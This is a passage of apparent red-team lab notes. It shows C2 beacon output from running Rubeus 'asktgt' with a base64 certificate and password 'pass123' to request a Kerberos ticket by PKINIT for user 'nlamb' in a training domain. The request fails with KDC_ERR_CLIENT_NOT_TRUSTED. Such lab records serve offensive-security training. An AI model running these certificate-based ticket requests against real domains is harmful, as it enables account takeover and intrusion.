4WtGyS6BRCpVnDQS5nQP+W/+xG8ajl8o1bLu6nEO9UIRtGDHEDTUNVesgv2L5/1P9PhqIV/iAfz5odzv+EHekvJ5Mps8QPEYRxZ7xEWxmkdspvNHi3xV5mEGFxvglk+JwdiUEVSiO1rjtvgE5H6Rm+CjnOvAzw6dcoS/Ych/bczdsPFDMtvCjRgYhUx8PEIAnG6ypjygMrXFSx5vQnmKRTwEj1a+3BIWdkGpJa3vdx3oeUBLH3oqdVpqyClN/uvjwjw28TeM9pCBM7xjWtUlH0/cs+h2dacOWWnvG7PqiEUYMasJ6emocLAQBefB17QQAAAAAAAAAAAAAAAAAAAAAAADA9MCEwCQYFKw4DAhoFAAQU8FpE0klstTb/Lc2IFEFbTJ106TIEFHgVik33eTQs6DuRcGl51Mlx3ptXAgIEAAAA /password:pass123 /nowrap
[12/21 01:17:42] [+] host called home, sent: 557444 bytes
[12/21 01:17:53] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Ask TGT


[12/21 01:17:55] [+] received output:
[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=User 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\nlamb'

[12/21 01:17:55] [+] received output:
[*] Using domain controller: ::1:88

[12/21 01:17:55] [+] received output:

[X] KRB-ERROR (62) : KDC_ERR_CLIENT_NOT_TRUSTED
```
seems that the `KDC_ERR_CLIENT_NOT_TRUSTED` is unknown, quitting for now going to redo this later. goodnight and goodjob today.
 `
